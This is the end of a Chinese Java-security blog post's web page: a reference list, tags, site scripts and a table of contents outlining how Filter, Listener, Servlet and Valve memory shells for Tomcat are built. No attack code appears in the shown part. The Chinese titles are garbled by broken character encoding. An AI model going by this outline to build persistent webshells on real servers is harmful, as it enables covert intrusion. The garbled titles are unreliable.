<p>[1] Amev, ‚ÄòTomcatÂÆπÂô®ÊîªÈò≤Á¨îËÆ∞‰πãFilterÂÜÖÂ≠òÈ©¨‚Äô, Weixin Official Accounts Platform. <a class="link" href="http://mp.weixin.qq.com/s?__biz=Mzk0NDE4MTI2MQ==&amp;mid=2247483745&amp;idx=1&amp;sn=2eee1ad5d99ca62aaf9b714b2889d16d&amp;chksm=c329d803f45e51156db26193b12d4df5029bc1bfbf92fd1b974642625bacfa5994d31c54acfa#rd"  target="_blank" rel="noopener"
    >http://mp.weixin.qq.com/s?__biz=Mzk0NDE4MTI2MQ==&mid=2247483745&idx=1&sn=2eee1ad5d99ca62aaf9b714b2889d16d&chksm=c329d803f45e51156db26193b12d4df5029bc1bfbf92fd1b974642625bacfa5994d31c54acfa#rd</a>. <!-- raw HTML omitted --></p>
<p>[2] ‚ÄòTomcat ÂÜÖÂ≠òÈ©¨ÊäÄÊúØÂàÜÊûêÔºà‰∏ÄÔºâ‚Äî‚Äî FilterÂûã-ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞‚Äô. <a class="link" href="https://www.anquanke.com/post/id/266240#h3-14"  target="_blank" rel="noopener"
    >https://www.anquanke.com/post/id/266240#h3-14</a>. <!-- raw HTML omitted --></p>
<p>[3] ‚Äò[JavaÂÆâÂÖ®]‚ÄîTomcat FilterÂÜÖÂ≠òÈ©¨_Sentiment.ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢‚Äô. <a class="link" href="https://blog.csdn.net/weixin_54902210/article/details/125830564"  target="_blank" rel="noopener"
    >https://blog.csdn.net/weixin_54902210/article/details/125830564</a>. <!-- raw HTML omitted --></p>
<p>[4] Êû´, ‚ÄòJavaÂÆâÂÖ®Â≠¶‰π†‚Äî‚ÄîÂÜÖÂ≠òÈ©¨‚Äô, Êû´„ÅÆBlog, May 11, 2022. <a class="link" href="https://goodapple.top/archives/1355"  target="_blank" rel="noopener"
    >https://goodapple.top/archives/1355</a>. <!-- raw HTML omitted --></p>
<p>[5] ‚ÄòJavaWeb ÂÜÖÂ≠òÈ©¨‰∏ÄÂë®ÁõÆÈÄöÂÖ≥ÊîªÁï• | Á¥†ÂçÅÂÖ´‚Äô. <a class="link" href="https://su18.org/post/memory-shell/#servlet-%E5%86%85%E5%AD%98%E9%A9%AC"  target="_blank" rel="noopener"
    >https://su18.org/post/memory-shell/#servlet-%E5%86%85%E5%AD%98%E9%A9%AC</a>. <!-- raw HTML omitted --></p>
<p>[6] ‚ÄòTomcatÂÜÖÂ≠òÈ©¨Â≠¶‰π†3ÔºöListenerÂûã_ÊµîÈò≥Ê±üÂ§¥Â§úÈÄÅÂÆ¢‰∏∂ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢_listener ÂÜÖÂ≠òÈ©¨‚Äô. <a class="link" href="https://blog.csdn.net/weixin_43263451/article/details/125966040"  target="_blank" rel="noopener"
    >https://blog.csdn.net/weixin_43263451/article/details/125966040</a>. <!-- raw HTML omitted --></p>
<p>[7] ‚ÄòServlet ÂêØÂä®Êó∂Âä†ËΩΩÔºúload-on-startupÔºû_allway2ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢_&lt;load-on-startup&gt;Âú®‰∏çÂÜô&lt;servlet-mapping&gt;ÁöÑÊó∂ÂÄô‰πüË¢´servletÂÆπ‚Äô. <a class="link" href="https://blog.csdn.net/allway2/article/details/124410669"  target="_blank" rel="noopener"
    >https://blog.csdn.net/allway2/article/details/124410669</a>. <!-- raw HTML omitted --></p>
<p>[8] ‚ÄòÂØπ‰∫éweb.xml‰∏≠ÁöÑservletÂÆö‰πâÔºå&lt;enabled&gt; false&lt;/enabled&gt;ÊòØ‰ªÄ‰πàÊÑèÊÄùÔºü - VoidCC‚Äô. <a class="link" href="http://cn.voidcc.com/question/p-fpiktyjo-ny.html"  target="_blank" rel="noopener"
    >http://cn.voidcc.com/question/p-fpiktyjo-ny.html</a>. <!-- raw HTML omitted --></p>
<p>[9] ‚Äòjsp Â£∞ÊòéÁ±ªÁöÑ‰ΩøÁî®‚Äô. <a class="link" href="https://m.51sjk.com/b21b247677/"  target="_blank" rel="noopener"
    >https://m.51sjk.com/b21b247677/</a>. <!-- raw HTML omitted --></p>
<p>[10] ‚ÄòJavaSec - JavaWeb - Tomcat Ê°ÜÊû∂‰ª•Âèä‰∏éServlet‰πãÈó¥ÁöÑËÅîÁ≥ª‚Äô, Under The Ginkgo, Oct. 20, 2022. <a class="link" href="https://ginkgo.org.cn/posts/javasec_javaweb_tomcat/"  target="_blank" rel="noopener"
    >https://ginkgo.org.cn/posts/javasec_javaweb_tomcat/</a>. <!-- raw HTML omitted --></p>
</blockquote>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/memshell/">memshell</a>
        
            <a href="/tags/java_sec/">java_sec</a>
        
            <a href="/tags/tomcat/">tomcat</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            Last updated on Nov 02, 2022 18:13 CST
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    

    

<aside class="related-contents--wrapper">
    <h2 class="section-title">Related contents</h2>
    <div class="related-contents">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/posts/javasec_runtimecommandexecution/">
        
        

        <div class="article-details">
            <h2 class="article-title">JavaÊú¨Âú∞ÂëΩ‰ª§ÊâßË°å</h2>
        </div>
    </a>
</article>
            
                
<article class="">
    <a href="/posts/javasec_javaweb_listener_and_filter/">
        
        

        <div class="article-details">
            <h2 class="article-title">JavaSec - Java Web - ‰∏âÂ§ßÊ†∏ÂøÉÁªÑ‰ª∂ - Listener &amp; Filter</h2>
        </div>
    </a>
</article>
            
                
<article class="">
    <a href="/posts/javasec_javaweb_jsp/">
        
        

        <div class="article-details">
            <h2 class="article-title">JavaSec - JavaWeb - JSPÂü∫Á°Ä</h2>
        </div>
    </a>
</article>
            
                
<article class="">
    <a href="/posts/javasec_javaweb_servlet/">
        
        

        <div class="article-details">
            <h2 class="article-title">JavaSec - Java Web - ‰∏âÂ§ßÊ†∏ÂøÉÁªÑ‰ª∂ - Servlet</h2>
        </div>
    </a>
</article>
            
                
<article class="">
    <a href="/posts/javasec_javabasic_reflection/">
        
        

        <div class="article-details">
            <h2 class="article-title">JavaSec - JavaÂü∫Á°Ä - ÂèçÂ∞ÑÔºàReflectionÔºâ</h2>
        </div>
    </a>
</article>
            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy;
        
        2022 Under The Ginkgo
    </section>

    <section class="powerby">
        
            Cogito, ergo sum <br/>
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
    </script>
    <section class="powerby">
      <span id="busuanzi_container_site_pv" style='display:none'>
        Viwe <span id="busuanzi_value_site_pv"></span> times
      </span>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ul>
    <li><a href="#ÂÜôÂú®ÂâçÈù¢">ÂÜôÂú®ÂâçÈù¢</a></li>
    <li><a href="#‰ªÄ‰πàÊòØÂÜÖÂ≠òÈ©¨-Âíå‰∏ÄÂè•ËØùÊú®È©¨Êúâ‰ªÄ‰πàÂå∫Âà´">‰ªÄ‰πàÊòØÂÜÖÂ≠òÈ©¨ÔºüÂíå‰∏ÄÂè•ËØùÊú®È©¨Êúâ‰ªÄ‰πàÂå∫Âà´Ôºü</a></li>
    <li><a href="#filterÂûã">FilterÂûã</a>
      <ul>
        <li><a href="#‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑfilterÊòØÂ¶Ç‰ΩïË¢´Âä†ËΩΩ‰ª•Âèä‰ΩøÁî®ÁöÑ">‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑFilterÊòØÂ¶Ç‰ΩïË¢´Âä†ËΩΩ‰ª•Âèä‰ΩøÁî®ÁöÑÔºü</a>
          <ul>
            <li><a href="#ÂºÄÂèëËá™ÂÆö‰πâfilterÁ±ª">ÂºÄÂèëËá™ÂÆö‰πâFilterÁ±ª</a></li>
            <li><a href="#tomcatÂú®ÂêØÂä®Êó∂Âä†ËΩΩfilter">TomcatÂú®ÂêØÂä®Êó∂Âä†ËΩΩFilter</a></li>
            <li><a href="#filterËøáÊª§ËØ∑Ê±Ç">FilterËøáÊª§ËØ∑Ê±Ç</a></li>
          </ul>
        </li>
        <li><a href="#filterÂÜÖÂ≠òÈ©¨ÁöÑÊûÑÈÄ†">FilterÂÜÖÂ≠òÈ©¨ÁöÑÊûÑÈÄ†</a></li>
        <li><a href="#Â∞èÁªì">Â∞èÁªì</a></li>
      </ul>
    </li>
    <li><a href="#listenerÂûã">ListenerÂûã</a>
      <ul>
        <li><a href="#ÂºÄÂèëËá™ÂÆö‰πâlistener">ÂºÄÂèëËá™ÂÆö‰πâListener</a>
          <ul>
            <li><a href="#ÂºÄÂèëlistenerÁ±ª">ÂºÄÂèëListenerÁ±ª</a></li>
            <li><a href="#tomcatÂêØÂä®Êó∂Ê≥®ÂÜåÂä†ËΩΩlistenerÁ±ª">TomcatÂêØÂä®Êó∂Ê≥®ÂÜåÂä†ËΩΩListenerÁ±ª</a></li>
            <li><a href="#tomcatË∞ÉÁî®">TomcatË∞ÉÁî®</a></li>
          </ul>
        </li>
        <li><a href="#ÊûÑÈÄ†listenerÂÜÖÂ≠òÈ©¨">ÊûÑÈÄ†ListenerÂÜÖÂ≠òÈ©¨</a></li>
      </ul>
    </li>
    <li><a href="#servletÂûã">ServletÂûã</a>
      <ul>
        <li><a href="#ÂºÄÂèëËá™ÂÆö‰πâservlet">ÂºÄÂèëËá™ÂÆö‰πâServlet</a>
          <ul>
            <li><a href="#ÂºÄÂèëservletÁ±ª">ÂºÄÂèëServletÁ±ª</a></li>
            <li><a href="#tomcatÂêØÂä®Êó∂Ê≥®ÂÜåÂä†ËΩΩservletÁ±ª">TomcatÂêØÂä®Êó∂Ê≥®ÂÜåÂä†ËΩΩServletÁ±ª</a></li>
            <li><a href="#Ë∞ÉÁî®servlet">Ë∞ÉÁî®Servlet</a></li>
          </ul>
        </li>
        <li><a href="#servletÂÜÖÂ≠òÈ©¨">ServletÂÜÖÂ≠òÈ©¨</a></li>
      </ul>
    </li>
    <li><a href="#valveÂûã">ValveÂûã</a>
      <ul>
        <li>
          <ul>
            <li><a href="#pipeline-valve-ÁÆ°ÈÅì-ÈòÄÈó®Ë¥£‰ªªÈìæÁÆÄ‰ªã">Pipeline-Valve ÁÆ°ÈÅì-ÈòÄÈó®Ë¥£‰ªªÈìæÁÆÄ‰ªã</a></li>
            <li><a href="#valveÂÜÖÂ≠òÈ©¨">ValveÂÜÖÂ≠òÈ©¨</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#ÂÜôÂú®ÊúÄÂêé">ÂÜôÂú®ÊúÄÂêé</a></li>
    <li><a href="#reference">Reference</a></li>
  </ul>
</nav>
        </div>
    </section>

            
        
    </aside>


        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
